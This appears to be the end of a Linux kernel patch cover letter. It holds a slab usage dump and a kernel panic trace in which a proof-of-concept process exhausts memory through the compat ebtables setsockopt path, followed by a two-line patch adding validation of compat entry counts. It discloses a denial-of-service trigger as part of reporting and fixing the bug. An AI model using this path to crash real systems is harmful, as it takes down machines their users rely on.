[  671.136416][T11148] sgpool-16                  1KB         15KB
[  671.136880][T11148] sgpool-8                   3KB         31KB
[  671.137386][T11148] bio_crypt_ctx             19KB         19KB
[  671.137859][T11148] request_queue            169KB        191KB
[  671.138378][T11148] blkdev_ioc                 0KB          7KB
[  671.138843][T11148] bio-200                   53KB         55KB
[  671.139315][T11148] biovec-max               455KB        612KB
[  671.139736][T11148] biovec-64                  0KB        125KB
[  671.140174][T11148] biovec-16                  0KB         31KB
[  671.140665][T11148] bio_integrity_payload          0KB          7KB
[  671.141167][T11148] user_namespace             0KB         15KB
[  671.141644][T11148] uid_cache                  0KB          7KB
[  671.142110][T11148] dmaengine-unmap-256          2KB         31KB
[  671.142597][T11148] dmaengine-unmap-128          1KB         31KB
[  671.143043][T11148] dmaengine-unmap-16          0KB          7KB
[  671.143489][T11148] dmaengine-unmap-2          0KB          4KB
[  671.143952][T11148] QIPCRTR                    1KB         31KB
[  671.144444][T11148] audit_buffer               0KB          3KB
[  671.144907][T11148] skbuff_small_head         30KB         63KB
[  671.145332][T11148] skbuff_fclone_cache          4KB         31KB
[  671.145814][T11148] skbuff_head_cache        100KB        181KB
[  671.146289][T11148] configfs_dir_cache          4KB          7KB
[  671.146767][T11148] file_lock_cache            1KB         30KB
[  671.147324][T11148] file_lock_ctx             19KB         27KB
[  671.147853][T11148] fsnotify_mark_connector         26KB         31KB
[  671.148379][T11148] taskstats                  1KB         15KB
[  671.148837][T11148] proc_dir_entry           371KB        411KB
[  671.149282][T11148] pde_opener                 2KB         11KB
[  671.149743][T11148] seq_file                  98KB        100KB
[  671.150211][T11148] sigqueue                   3KB         15KB
[  671.150688][T11148] shmem_inode_cache       9681KB       9771KB
[  671.151152][T11148] kernfs_iattrs_cache         39KB         89KB
[  671.151646][T11148] kernfs_node_cache      22349KB      22483KB
[  671.152111][T11148] mnt_cache                 64KB        104KB
[  671.152595][T11148] filp                     955KB       1921KB
[  671.153063][T11148] names_cache            21730KB      21896KB
[  671.153543][T11148] net_namespace             15KB         30KB
[  671.154010][T11148] ima_iint_cache           370KB        378KB
[  671.154497][T11148] lsm_inode_cache         5681KB       5744KB
[  671.154973][T11148] lsm_file_cache           333KB        548KB
[  671.155452][T11148] key_jar                   25KB         40KB
[  671.155925][T11148] uts_namespace              1KB         15KB
[  671.156404][T11148] nsproxy                    0KB          3KB
[  671.156870][T11148] vma_lock                1425KB       1606KB
[  671.157388][T11148] vm_area_struct          1598KB       1779KB
[  671.157942][T11148] fs_cache                  20KB         78KB
[  671.158430][T11148] files_cache               53KB        350KB
[  671.158904][T11148] signal_cache             582KB       2047KB
[  671.159395][T11148] sighand_cache            790KB       2439KB
[  671.159874][T11148] task_struct             3114KB       4492KB
[  671.160355][T11148] cred                     153KB        637KB
[  671.160822][T11148] anon_vma_chain           676KB        677KB
[  671.161299][T11148] anon_vma                 615KB        708KB
[  671.161750][T11148] pid                      147KB        488KB
[  671.162197][T11148] Acpi-Operand              79KB        162KB
[  671.162674][T11148] Acpi-ParseExt              0KB         15KB
[  671.163145][T11148] Acpi-Parse                 0KB         15KB
[  671.163619][T11148] Acpi-State                 0KB         15KB
[  671.164063][T11148] Acpi-Namespace            57KB         62KB
[  671.164549][T11148] numa_policy                0KB          3KB
[  671.165016][T11148] perf_event                 0KB         31KB
[  671.165494][T11148] trace_event_file        1702KB       1705KB
[  671.165959][T11148] ftrace_event_field       1833KB       1834KB
[  671.166442][T11148] pool_workqueue          1164KB       1197KB
[  671.166918][T11148] maple_node              2907KB       4063KB
[  671.167446][T11148] task_group                31KB         47KB
[  671.167926][T11148] mm_struct                165KB        300KB
[  671.168405][T11148] vmap_area                681KB       1067KB
[  671.168840][T11148] debug_objects_cache       3101KB       3107KB
[  671.169333][T11148] page->ptl                151KB        197KB
[  671.169794][T11148] kmalloc-cg-8k            120KB        120KB
[  671.170260][T11148] kmalloc-cg-4k           4728KB       4728KB
[  671.170737][T11148] kmalloc-cg-2k           3462KB       3870KB
[  671.171201][T11148] kmalloc-cg-1k            984KB       1170KB
[  671.171683][T11148] kmalloc-cg-512           349KB        504KB
[  671.172146][T11148] kmalloc-cg-256           100KB        126KB
[  671.172615][T11148] kmalloc-cg-128            63KB         78KB
[  671.173080][T11148] kmalloc-cg-64             15KB         24KB
[  671.173553][T11148] kmalloc-cg-32             69KB         90KB
[  671.174028][T11148] kmalloc-cg-16             66KB        279KB
[  671.174508][T11148] kmalloc-cg-8              14KB         31KB
[  671.174976][T11148] kmalloc-cg-192            65KB         86KB
[  671.175451][T11148] kmalloc-cg-96             41KB         48KB
[  671.175935][T11148] kmalloc-8k              4080KB       4080KB
[  671.176407][T11148] kmalloc-4k             47460KB      47544KB
[  671.176886][T11148] kmalloc-2k             15366KB      15390KB
[  671.177418][T11148] kmalloc-1k              6987KB       7170KB
[  671.177891][T11148] kmalloc-512             6966KB       7402KB
[  671.178371][T11148] kmalloc-256             7131KB       7134KB
[  671.178839][T11148] kmalloc-128             1110KB       1338KB
[  671.179314][T11148] kmalloc-64              8092KB       8156KB
[  671.179807][T11148] kmalloc-32              1711KB       2224KB
[  671.180423][T11148] kmalloc-16              1956KB       2114KB
[  671.180900][T11148] kmalloc-8               1216KB       1326KB
[  671.181401][T11148] kmalloc-192             2505KB       2811KB
[  671.181881][T11148] kmalloc-96              3661KB       3728KB
[  671.182421][T11148] kmem_cache_node          177KB        179KB
[  671.182853][T11148] kmem_cache               213KB        220KB
[  671.183340][T11148] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  671.184016][T11148] CPU: 1 UID: 0 PID: 11148 Comm: poc Not tainted 6.12.95 #2
[  671.184573][T11148] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  671.185493][T11148] Call Trace:
[  671.185754][T11148]  <TASK>
[  671.185989][T11148]  panic+0x533/0x610
[  671.186313][T11148]  ? count_partial_free_approx+0x60/0x160
[  671.186757][T11148]  ? __pfx_panic+0x10/0x10
[  671.187136][T11148]  out_of_memory+0x73c/0x1430
[  671.187515][T11148]  ? __alloc_pages_noprof+0xd53/0x26d0
[  671.187936][T11148]  ? __pfx_out_of_memory+0x10/0x10
[  671.188344][T11148]  ? lock_acquire+0x2f/0xb0
[  671.188695][T11148]  ? __alloc_pages_noprof+0xd53/0x26d0
[  671.189132][T11148]  __alloc_pages_noprof+0x1ecc/0x26d0
[  671.189580][T11148]  ? __pfx___alloc_pages_noprof+0x10/0x10
[  671.190015][T11148]  ? __pfx_vmap_small_pages_range_noflush+0x10/0x10
[  671.190531][T11148]  ? __vmalloc_node_range_noprof+0x33a/0x1090
[  671.191003][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.191445][T11148]  ? alloc_pages_bulk_array_mempolicy_noprof+0x1d4/0xd70
[  671.191984][T11148]  alloc_pages_mpol_noprof+0x1ab/0x4d0
[  671.192414][T11148]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[  671.192887][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.193340][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.193773][T11148]  ? __pfx___might_resched+0x10/0x10
[  671.194184][T11148]  __vmalloc_node_range_noprof+0x584/0x1090
[  671.194636][T11148]  ? compat_do_replace+0x183/0x710
[  671.195052][T11148]  ? __pfx___vmalloc_node_range_noprof+0x10/0x10
[  671.195538][T11148]  ? compat_do_replace+0x183/0x710
[  671.195882][T11148]  vmalloc_noprof+0x6b/0x90
[  671.196234][T11148]  ? compat_do_replace+0x183/0x710
[  671.196666][T11148]  compat_do_replace+0x183/0x710
[  671.197087][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.197509][T11148]  ? __pfx_compat_do_replace+0x10/0x10
[  671.197947][T11148]  ? __pfx_aa_get_newest_label+0x10/0x10
[  671.198405][T11148]  ? apparmor_capable+0xb9/0x180
[  671.198814][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.199260][T11148]  ? security_capable+0x8a/0x150
[  671.199675][T11148]  do_ebt_set_ctl+0x31a/0x390
[  671.200021][T11148]  ? __pfx_do_ebt_set_ctl+0x10/0x10
[  671.200420][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.200978][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.201426][T11148]  nf_setsockopt+0x76/0xe0
[  671.201787][T11148]  do_sock_setsockopt+0x1b8/0x3b0
[  671.202182][T11148]  ? __pfx_do_sock_setsockopt+0x10/0x10
[  671.202610][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.203035][T11148]  ? find_held_lock+0x2d/0x110
[  671.203422][T11148]  ? __might_fault+0xb6/0x120
[  671.203794][T11148]  ? lock_acquire+0x2f/0xb0
[  671.204152][T11148]  __sys_setsockopt+0x144/0x1c0
[  671.204545][T11148]  __do_compat_sys_socketcall+0x3ec/0x5d0
[  671.204980][T11148]  ? do_user_addr_fault+0x8be/0xe10
[  671.205386][T11148]  ? __pfx___do_compat_sys_socketcall+0x10/0x10
[  671.205869][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.206309][T11148]  ? lock_acquire+0x2f/0xb0
[  671.206672][T11148]  ? srso_alias_return_thunk+0x5/0xfbef5
[  671.207137][T11148]  do_int80_emulation+0xfc/0x1f0
[  671.207531][T11148]  asm_int80_emulation+0x1a/0x20
[  671.207909][T11148] RIP: 0023:0x804933e
[  671.208226][T11148] Code: Unable to access opcode bytes at 0x8049314.
[  671.208724][T11148] RSP: 002b:00000000ffd96130 EFLAGS: 00000246 ORIG_RAX: 0000000000000066
[  671.209371][T11148] RAX: ffffffffffffffda RBX: 000000000000000e RCX: 00000000ffd9615c
[  671.209976][T11148] RDX: 0000000000000000 RSI: 0000000000000066 RDI: 00000000ffd96170
[  671.210578][T11148] RBP: 00000000ffd96208 R08: 0000000000000000 R09: 0000000000000000
[  671.211178][T11148] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[  671.211782][T11148] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  671.212418][T11148]  </TASK>
[  671.212802][T11148] Kernel Offset: disabled
[  671.213181][T11148] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: ebtables: validate compat nentries

 net/bridge/netfilter/ebtables.c | 2 ++
 1 file changed, 2 insertions(+)

-- 
2.55.0
